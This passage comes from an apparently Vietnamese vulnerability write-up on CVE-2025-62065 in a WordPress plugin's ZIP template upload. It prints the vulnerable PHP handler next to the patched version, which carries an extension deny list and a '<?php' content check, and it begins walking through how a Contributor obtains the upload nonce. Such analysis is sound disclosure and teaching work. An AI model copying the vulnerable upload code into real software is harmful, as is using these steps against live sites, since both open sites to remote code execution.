0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;function rtm_handle_upload_template()&#xA;{&#xA;    check_ajax_referer(&amp;#39;rtm_template_nonce&amp;#39;, &amp;#39;nonce&amp;#39;);&#xA;&#xA;    if (empty($_FILES[&amp;#39;file&amp;#39;])) {&#xA;        wp_send_json_error(&amp;#39;Tidak ada file yang diupload.&amp;#39;);&#xA;    }&#xA;&#xA;    $file = $_FILES[&amp;#39;file&amp;#39;];&#xA;    $ext = strtolower(pathinfo($file[&amp;#39;name&amp;#39;], PATHINFO_EXTENSION));&#xA;    if ($ext !== &amp;#39;zip&amp;#39;) {&#xA;        wp_send_json_error(&amp;#39;Hanya file .zip yang diperbolehkan.&amp;#39;);&#xA;    }&#xA;&#xA;    $upload_dir = wp_upload_dir();&#xA;    // path di server&#xA;    $tmpFilePath = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rtm_temp_&amp;#39; . wp_unique_filename($upload_dir[&amp;#39;basedir&amp;#39;], $file[&amp;#39;name&amp;#39;]);&#xA;&#xA;    // URL publik&#xA;    $tmpFileUrl  = $upload_dir[&amp;#39;baseurl&amp;#39;] . &amp;#39;/&amp;#39; . basename($tmpFilePath);&#xA;&#xA;    if (!move_uploaded_file($file[&amp;#39;tmp_name&amp;#39;], $tmpFilePath)) {&#xA;        wp_send_json_error(&amp;#39;Gagal menyimpan file sementara.&amp;#39;);&#xA;    }&#xA;&#xA;    $res = $this-&amp;gt;template_extract($tmpFileUrl, $file[&amp;#39;name&amp;#39;], true);&#xA;&#xA;    // setelah selesai hapus file&#xA;    if (file_exists($tmpFilePath)) unlink($tmpFilePath);&#xA;    if ($res) {&#xA;        wp_send_json_success(&amp;#39;Template berhasil diupload dan diekstrak.&amp;#39;);&#xA;    } else {&#xA;        wp_send_json_error($res);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;function template_extract($url, $id, $return = false)&#xA;{&#xA;    $upload_dir = wp_upload_dir();&#xA;    $custom_dir = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rometheme_template&amp;#39;;&#xA;    $tempFile = wp_tempnam($url);&#xA;&#xA;    $hashId = wp_hash($id);&#xA;    $targetDir = $custom_dir . &amp;#39;/&amp;#39; . $hashId;&#xA;&#xA;    $response = wp_remote_get($url, [&amp;#39;timeout&amp;#39; =&amp;gt; 300]);&#xA;&#xA;    if (is_wp_error($response)) {&#xA;        wp_send_json_error($response-&amp;gt;get_error_message());&#xA;    }&#xA;&#xA;    $fileContent = wp_remote_retrieve_body($response);&#xA;&#xA;    file_put_contents($tempFile, $fileContent);&#xA;&#xA;    $zip = new ZipArchive();&#xA;    if ($zip-&amp;gt;open($tempFile) === TRUE) {&#xA;        wp_mkdir_p($targetDir);&#xA;        $zip-&amp;gt;extractTo($targetDir);&#xA;        $zip-&amp;gt;close();&#xA;        unlink($tempFile);&#xA;&#xA;        $option = get_option(&amp;#39;rtm_template_installed&amp;#39;, []); // Default ke array jika tidak ada option&#xA;        if (!is_array($option)) {&#xA;            $option = []; // Pastikan $option adalah array&#xA;        }&#xA;        $option[$hashId] = [&#xA;            &amp;#39;template_id&amp;#39; =&amp;gt; $id&#xA;        ];&#xA;&#xA;        update_option(&amp;#39;rtm_template_installed&amp;#39;, $option); // Simpan kembali ke database&#xA;&#xA;        if ($return) {&#xA;            return true;&#xA;        } else {&#xA;            wp_send_json_success([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;success extract&amp;#39;, &amp;#39;template&amp;#39; =&amp;gt; $hashId]);&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không kiểm tra quyền người dùng hợp lệ:&lt;/strong&gt; chỉ gọi &lt;code&gt;check_ajax_referer()&lt;/code&gt; nhưng không kiểm tra capability (ví dụ &lt;code&gt;current_user_can&lt;/code&gt;) → user có nonce hợp lệ hoặc nonce bị lộ vẫn có thể upload.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Lưu file tạm vào thư mục public (&lt;code&gt;wp_upload_dir()&lt;/code&gt;):&lt;/strong&gt; &lt;code&gt;$tmpFilePath&lt;/code&gt; nằm trong &lt;code&gt;uploads/&lt;/code&gt; nên có thể truy cập qua URL (&lt;code&gt;$tmpFileUrl&lt;/code&gt;) trong thời gian file tồn tại.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Lấy lại file qua URL public trước khi giải nén:&lt;/strong&gt; &lt;code&gt;template_extract()&lt;/code&gt; dùng &lt;code&gt;wp_remote_get($tmpFileUrl)&lt;/code&gt; → phụ thuộc vào URL công khai.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Giải nén trực tiếp vào thư mục public:&lt;/strong&gt; &lt;code&gt;extractTo($targetDir)&lt;/code&gt; trong &lt;code&gt;uploads/rometheme_template&lt;/code&gt; → nếu file .php được chép lên, web server có thể thực thi.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không whitelist/deny extension:&lt;/strong&gt; không loại bỏ hoặc từ chối các file thực thi (&lt;code&gt;.php&lt;/code&gt;, &lt;code&gt;.phtml&lt;/code&gt;, &lt;code&gt;.phar&lt;/code&gt;, &lt;code&gt;.sh&lt;/code&gt;, &lt;code&gt;.exe&lt;/code&gt;, &amp;hellip;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không kiểm tra nội dung file (embedded PHP):&lt;/strong&gt; không có bước đọc/scan để phát hiện &lt;code&gt;&amp;lt;?php&lt;/code&gt; trước khi lưu.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Rủi ro tạm thời public:&lt;/strong&gt; vì file tạm là public trong suốt quá trình, kẻ tấn công có thời gian truy cập/thiết lập payload trước khi file bị unlink.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; Khả năng RCE rất cao.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function rtm_handle_upload_template()&#xA;{&#xA;    check_ajax_referer(&amp;#39;rtm_template_nonce&amp;#39;, &amp;#39;nonce&amp;#39;);&#xA;&#xA;    if (empty($_FILES[&amp;#39;file&amp;#39;])) {&#xA;        wp_send_json_error(&amp;#39;No File Uploaded.&amp;#39;);&#xA;    }&#xA;&#xA;    if (! current_user_can(&amp;#39;manage_options&amp;#39;)) {&#xA;        wp_send_json_error(&#xA;            array(&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Insufficient permissions&amp;#39;),&#xA;            403&#xA;        );&#xA;    }&#xA;&#xA;    $file = $_FILES[&amp;#39;file&amp;#39;];&#xA;    $ext  = strtolower(pathinfo($file[&amp;#39;name&amp;#39;], PATHINFO_EXTENSION));&#xA;    if ($ext !== &amp;#39;zip&amp;#39;) {&#xA;        wp_send_json_error(&amp;#39;Only .zip file allowed.&amp;#39;);&#xA;    }&#xA;    $upload_dir = wp_upload_dir();&#xA;    // Direktori aman (bukan langsung ke uploads publik)&#xA;    $base_safe_dir = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;//rometheme_template/&amp;#39;;&#xA;    $tmp_dir       = $base_safe_dir . &amp;#39;tmp/&amp;#39;;&#xA;    if (! file_exists($tmp_dir)) {&#xA;        wp_mkdir_p($tmp_dir);&#xA;        // cegah eksekusi file php di folder ini&#xA;        @file_put_contents(&#xA;            $base_safe_dir . &amp;#39;.htaccess&amp;#39;,&#xA;            &amp;#34;Options -Indexes &amp;lt;FilesMatch &amp;#34;.(php|phtml|phar)$&amp;#34;&amp;gt;  Deny from all&amp;lt;/FilesMatch&amp;gt;&amp;#34;&#xA;        );&#xA;    }&#xA;&#xA;    // Buat nama unik untuk zip&#xA;    $unique       = wp_generate_password(12, false);&#xA;    $tmp_zip_path = $tmp_dir . &amp;#39;upload_&amp;#39; . $unique . &amp;#39;.zip&amp;#39;;&#xA;&#xA;    // Simpan file upload ke lokasi aman&#xA;    if (! move_uploaded_file($file[&amp;#39;tmp_name&amp;#39;], $tmp_zip_path)) {&#xA;        wp_send_json_error(&#xA;            array(&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Failed save temporary file.&amp;#39;),&#xA;            500&#xA;        );&#xA;    }&#xA;&#xA;    // Proses ekstraksi dengan fungsi aman&#xA;    $res = $this-&amp;gt;template_extract_secure($tmp_zip_path, $file[&amp;#39;name&amp;#39;], true);&#xA;&#xA;    // Hapus zip sementara&#xA;    if (file_exists($tmp_zip_path)) {&#xA;        @unlink($tmp_zip_path);&#xA;    }&#xA;&#xA;    if ($res) {&#xA;        wp_send_json_success(&amp;#39;Template has been successfully extracted.&amp;#39;);&#xA;    } else {&#xA;        wp_send_json_error(&amp;#39;Failed extracting template.&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;function template_extract_secure($zip_path, $id, $return = false)&#xA;{&#xA;    if (empty($zip_path) || ! file_exists($zip_path)) {&#xA;        return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Zip file not found.&amp;#39;], 400);&#xA;    }&#xA;&#xA;    $zip_path = realpath($zip_path);&#xA;    if (strpos($zip_path, realpath(WP_CONTENT_DIR)) !== 0) {&#xA;        return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Invalid zip location.&amp;#39;, &amp;#39;path&amp;#39; =&amp;gt; $zip_path], 403);&#xA;    }&#xA;&#xA;    $upload_dir = wp_upload_dir();&#xA;    $hashId     = wp_hash($id);&#xA;    $base_dir   = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rometheme_template&amp;#39;;&#xA;    $targetDir  = $base_dir . &amp;#39;/&amp;#39; . $hashId . &amp;#39;/&amp;#39;;&#xA;&#xA;    // buat base dir &amp;#43; proteksi root&#xA;    if (! file_exists($base_dir)) {&#xA;        wp_mkdir_p($base_dir);&#xA;        @file_put_contents($base_dir . &amp;#39;/.htaccess&amp;#39;, &amp;#34;Options -Indexes&amp;lt;FilesMatch &amp;#34;.(php|phtml|phar)$\&amp;#34;&amp;gt; Deny from all&amp;lt;/FilesMatch&amp;gt;&amp;#34;);&#xA;    }&#xA;    if (! file_exists($targetDir)) {&#xA;        wp_mkdir_p($targetDir);&#xA;        @file_put_contents($targetDir . &amp;#39;index.html&amp;#39;, &amp;#39;&amp;lt;!-- protected --&amp;gt;&amp;#39;);&#xA;    }&#xA;&#xA;    $zip = new ZipArchive();&#xA;    if ($zip-&amp;gt;open($zip_path) !== true) {&#xA;        return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Invalid or corrupt zip.&amp;#39;], 400);&#xA;    }&#xA;&#xA;    // whitelist extension&#xA;    $allowed_ext = [&amp;#39;jpg&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;png&amp;#39;, &amp;#39;gif&amp;#39;, &amp;#39;svg&amp;#39;, &amp;#39;webp&amp;#39;, &amp;#39;json&amp;#39;, &amp;#39;css&amp;#39;, &amp;#39;js&amp;#39;, &amp;#39;txt&amp;#39;, &amp;#39;html&amp;#39;, &amp;#39;htm&amp;#39;, &amp;#39;md&amp;#39;];&#xA;&#xA;    // cek isi zip&#xA;    for ($i = 0; $i &amp;lt; $zip-&amp;gt;numFiles; $i&amp;#43;&amp;#43;) {&#xA;        $entry = $zip-&amp;gt;getNameIndex($i);&#xA;        if (substr($entry, -1) === &amp;#39;/&amp;#39;) continue;&#xA;&#xA;        $normalized = str_replace(&amp;#39;\\&amp;#39;, &amp;#39;/&amp;#39;, $entry);&#xA;&#xA;        // block traversal / absolute&#xA;        if (strpos($normalized, &amp;#39;../&amp;#39;) !== false || substr($normalized, 0, 1) === &amp;#39;/&amp;#39; || preg_match(&amp;#39;/^[A-Za-z]:\\\\/&amp;#39;, $entry)) {&#xA;            $zip-&amp;gt;close();&#xA;            error_log(&amp;#34;[rtm] rejected: traversal ($entry)&amp;#34;);&#xA;            return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Zip contains invalid paths.&amp;#39;], 400);&#xA;        }&#xA;&#xA;        $entry_ext = strtolower(pathinfo($entry, PATHINFO_EXTENSION));&#xA;        if (empty($entry_ext) || in_array($entry_ext, [&amp;#39;php&amp;#39;, &amp;#39;phtml&amp;#39;, &amp;#39;phar&amp;#39;, &amp;#39;exe&amp;#39;, &amp;#39;sh&amp;#39;, &amp;#39;pl&amp;#39;, &amp;#39;cgi&amp;#39;], true)) {&#xA;            $zip-&amp;gt;close();&#xA;            error_log(&amp;#34;[rtm] rejected: bad extension ($entry)&amp;#34;);&#xA;            return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Zip contains disallowed file types.&amp;#39;], 400);&#xA;        }&#xA;&#xA;        if (! in_array($entry_ext, $allowed_ext, true)) {&#xA;            $zip-&amp;gt;close();&#xA;            error_log(&amp;#34;[rtm] rejected: unsupported ext $entry_ext ($entry)&amp;#34;);&#xA;            return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#34;Unsupported file type: $entry_ext&amp;#34;], 400);&#xA;        }&#xA;    }&#xA;&#xA;    // ekstrak dengan struktur folder asli&#xA;    for ($i = 0; $i &amp;lt; $zip-&amp;gt;numFiles; $i&amp;#43;&amp;#43;) {&#xA;        $entry = $zip-&amp;gt;getNameIndex($i);&#xA;        if (substr($entry, -1) === &amp;#39;/&amp;#39;) continue;&#xA;&#xA;        $entry_ext = strtolower(pathinfo($entry, PATHINFO_EXTENSION));&#xA;        if (! in_array($entry_ext, $allowed_ext, true)) continue;&#xA;&#xA;        $normalized = str_replace(&amp;#39;\\&amp;#39;, &amp;#39;/&amp;#39;, $entry);&#xA;        $safe_name  = sanitize_file_name(basename($normalized));&#xA;        $subdir     = dirname($normalized);&#xA;&#xA;        $final_dir  = $targetDir . ($subdir !== &amp;#39;.&amp;#39; ? $subdir . &amp;#39;/&amp;#39; : &amp;#39;&amp;#39;);&#xA;        wp_mkdir_p($final_dir);&#xA;&#xA;        $target_path = $final_dir . $safe_name;&#xA;&#xA;        $stream = $zip-&amp;gt;getStream($entry);&#xA;        if ($stream === false) continue;&#xA;&#xA;        $out = fopen($target_path, &amp;#39;w&amp;#39;);&#xA;        if ($out === false) {&#xA;            fclose($stream);&#xA;            continue;&#xA;        }&#xA;&#xA;        while (! feof($stream)) fwrite($out, fread($stream, 8192));&#xA;        fclose($out);&#xA;        fclose($stream);&#xA;&#xA;        // detect embedded php&#xA;        $head = @file_get_contents($target_path, false, null, 0, 512);&#xA;        if ($head !== false &amp;amp;&amp;amp; stripos($head, &amp;#39;&amp;lt;?php&amp;#39;) !== false) {&#xA;            @unlink($target_path);&#xA;            error_log(&amp;#34;[rtm] removed suspicious file ($target_path)&amp;#34;);&#xA;            continue;&#xA;        }&#xA;&#xA;        // sanity check → skip mismatch untuk json agar manifest.json tidak kehapus&#xA;        $check = wp_check_filetype_and_ext($target_path, $safe_name);&#xA;        if ($entry_ext !== &amp;#39;json&amp;#39; &amp;amp;&amp;amp; $check &amp;amp;&amp;amp; isset($check[&amp;#39;ext&amp;#39;]) &amp;amp;&amp;amp; $check[&amp;#39;ext&amp;#39;] !== $entry_ext) {&#xA;            @unlink($target_path);&#xA;            error_log(&amp;#34;[rtm] removed mismatch file ($target_path)&amp;#34;);&#xA;            continue;&#xA;        }&#xA;    }&#xA;&#xA;    $zip-&amp;gt;close();&#xA;&#xA;    // update option&#xA;    $option = get_option(&amp;#39;rtm_template_installed&amp;#39;, []);&#xA;    if (! is_array($option)) $option = [];&#xA;    $option[$hashId] = [&amp;#39;template_id&amp;#39; =&amp;gt; $hashId, &amp;#39;created&amp;#39; =&amp;gt; current_time(&amp;#39;mysql&amp;#39;)];&#xA;    update_option(&amp;#39;rtm_template_installed&amp;#39;, $option);&#xA;&#xA;    return $return ? true : wp_send_json_success([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;success extract&amp;#39;, &amp;#39;template&amp;#39; =&amp;gt; $hashId]);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kiểm tra quyền người dùng:&lt;/strong&gt; thêm &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt; → chỉ admin mới được upload.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Đưa file tạm vào thư mục an toàn, không public:&lt;/strong&gt; dùng &lt;code&gt;wp_upload_dir()&lt;/code&gt; nhưng tạo &lt;code&gt;.../rometheme_template/tmp/&lt;/code&gt; làm nơi lưu tạm, không trả URL public cho file tạm.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tạo &lt;code&gt;.htaccess&lt;/code&gt; để chặn thực thi:&lt;/strong&gt; khi tạo base dir, ghi &lt;code&gt;.htaccess&lt;/code&gt; có &lt;code&gt;Deny from all&lt;/code&gt; / &lt;code&gt;FilesMatch &amp;quot;\.(php|phtml|phar)$&amp;quot;&lt;/code&gt; để ngăn Apache/PHP thực thi các file nguy hiểm.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tên file tạm ngẫu nhiên:&lt;/strong&gt; dùng &lt;code&gt;wp_generate_password(12, false)&lt;/code&gt; đặt tên file như &lt;code&gt;upload_&amp;lt;random&amp;gt;.zip&lt;/code&gt; → giảm khả năng đoán/truy cập.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Xóa file tạm sau xử lý:&lt;/strong&gt; vẫn unlink zip sau khi xử lý; nay file nằm trong khu vực không public trước khi xóa.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thay hàm giải nén bằng &lt;code&gt;template_extract_secure()&lt;/code&gt;:&lt;/strong&gt; hàm mới chứa nhiều kiểm tra an toàn trước và trong khi giải nén:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kiểm tra vị trí file ZIP:&lt;/strong&gt; &lt;code&gt;realpath()&lt;/code&gt; và so sánh với &lt;code&gt;WP_CONTENT_DIR&lt;/code&gt; để đảm bảo zip nằm trong thư mục hợp lệ.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tạo thư mục đích &amp;amp; bảo vệ root:&lt;/strong&gt; tạo base dir và &lt;code&gt;index.html&lt;/code&gt; ở target để tránh directory listing; tạo &lt;code&gt;.htaccess&lt;/code&gt; ở base dir.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Mở ZIP an toàn:&lt;/strong&gt; kiểm tra &lt;code&gt;open()&lt;/code&gt; thành công, nếu lỗi trả về tương ứng.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Whitelist phần mở rộng:&lt;/strong&gt; chỉ cho phép các ext an toàn (&lt;code&gt;jpg,jpeg,png,gif,svg,webp,json,css,js,txt,html,htm,md&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Chặn path traversal &amp;amp; path tuyệt đối:&lt;/strong&gt; từ chối entry chứa &lt;code&gt;../&lt;/code&gt;, bắt đầu bằng &lt;code&gt;/&lt;/code&gt; hoặc drive letter (Windows) → ngăn Zip Slip.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Từ chối extension nguy hiểm:&lt;/strong&gt; nếu entry có ext rỗng hoặc ext trong danh sách đen (&lt;code&gt;php,phtml,phar,exe,sh,pl,cgi&lt;/code&gt;&amp;hellip;) thì đóng zip và trả lỗi.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tránh mismatch mime/ext:&lt;/strong&gt; dùng &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt;; nếu mismatch (trừ json) thì xóa file.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Scan nội dung đầu file:&lt;/strong&gt; đọc 512 bytes đầu; nếu thấy &lt;code&gt;&amp;lt;?php&lt;/code&gt; thì xóa file đó.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Giải nén từng file bằng stream:&lt;/strong&gt; ghi từng entry vào đường dẫn đã normalize và sanitize (&lt;code&gt;sanitize_file_name(basename(...))&lt;/code&gt;) thay vì extractTo trực tiếp.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Cập nhật option an toàn hơn:&lt;/strong&gt; lưu &lt;code&gt;$hashId&lt;/code&gt; cùng timestamp &lt;code&gt;created&lt;/code&gt; vào &lt;code&gt;rtm_template_installed&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Trả về/điều khiển lỗi rõ ràng:&lt;/strong&gt; nhiều &lt;code&gt;wp_send_json_error()&lt;/code&gt; với mã trạng thái/mesage cụ thể khi gặp vấn đề (file not found, invalid zip, disallowed types&amp;hellip;).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; Giảm mạnh mọi rủi ro tấn công thông qua upload ZIP, không thể RCE&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Trong phiên bản lỗi, Hàm nhận một file upload(kỳ vọng &lt;code&gt;.zip&lt;/code&gt;), lưu tạm vào thư mục &lt;code&gt;uploads/&lt;/code&gt;, sau đó gọi &lt;code&gt;template_extract()&lt;/code&gt; để tải lại và giải nén nó. Cuối cùng xóa file tạm và trả JSON &lt;code&gt;success/fail&lt;/code&gt;. Cụ thể:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;check_ajax_referer(&#39;rtm_template_nonce&#39;, &#39;nonce&#39;)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Giúp bảo vệ trước &lt;code&gt;CSRF&lt;/code&gt; - đảm bảo request AJAX hợp lệ và có &lt;code&gt;nonce&lt;/code&gt;. Khi search với từ khóa &lt;code&gt;rtm_template_nonce&lt;/code&gt; trong thư mục plugin:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-04-cve-2025-62065/nonce_create.png&#34; title=&#34;Cách nonce có action rtm_template_nonce được tạo&#34; data-thumbnail=&#34;/posts/2025-11-04-cve-2025-62065/nonce_create.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce Create&lt;/h2&gt;&lt;p&gt;Cách nonce có action rtm_template_nonce được tạo&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-04-cve-2025-62065/nonce_create.png&#39; alt=&#34;Nonce Create&#34; height=&#34;572&#34; width=&#34;1790&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cách nonce có action rtm_template_nonce được tạo&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;wp_localize_script()&lt;/code&gt; sẽ in một đoạn &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; inline vào trang và trong đó khai báo một biến JS (object) chứa dữ liệu được truyền vào. Trong trường hợp này, object là &lt;code&gt;rkit_libs&lt;/code&gt; lưu trữ các giá trị &lt;code&gt;logo_url&lt;/code&gt;, &lt;code&gt;ajax_url&lt;/code&gt;, &lt;code&gt;template_nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Mẹo&lt;/p&gt;&lt;p&gt;Vì lỗ hổng được công bố với đặc quyền &lt;strong&gt;Contributor&lt;/strong&gt;, thường liên quan đến việc tạo &lt;strong&gt;post&lt;/strong&gt; nên ta thử tạo post và gọi đối tượng &lt;code&gt;rkit_libs&lt;/code&gt; từ console của trình duyệt để lấy giá trị &lt;code&gt;nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Ta edit post bằng &lt;strong&gt;Elementor&lt;/strong&gt; , vì các widget của plugin được sử dụng bằng &lt;strong&gt;Elementor&lt;/strong&gt;, editor mặc định không có.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-04-cve-2025-62065/get_nonce.png&#34; title=&#34;Lấy nonce từ console của trình duyệt&#34; data-thumbnail=&#34;/posts/2025-11-04-cve-2025-62065/get_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Get Nonce&lt;/h2&gt;&lt;p&gt;Lấy nonce từ console của trình duyệt&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-04-cve-2025-62065/get_nonce.png&#39; alt=&#34;Get Nonce&#34; height=&#34;649&#34; width=&#34;821&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Lấy nonce từ console của trình duyệt&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Kiểm tra &lt;code&gt;$_FILES[&#39;file&#39;]&lt;/code&gt; và &lt;strong&gt;extension&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (empty($_FILES[&amp;#39;file&amp;#39;])) {&#xA;    wp_send_json_error(&amp;#39;Tidak ada file yang diupload.&amp;#39;);&#xA;}&#xA;&#xA;$file = $_FILES[&amp;#39;file&amp;#39;];&#xA;$ext = strtolower(pathinfo($file[&amp;#39;name&amp;#39;], PATHINFO_EXTENSION));&#xA;if ($ext !== &amp;#39;zip&amp;#39;) {&#xA;    wp_send_json_error(&amp;#39;Hanya file .zip yang diperbolehkan.&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đảm bảo client gửi file và chỉ cho phép upload &lt;code&gt;.zip&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ol 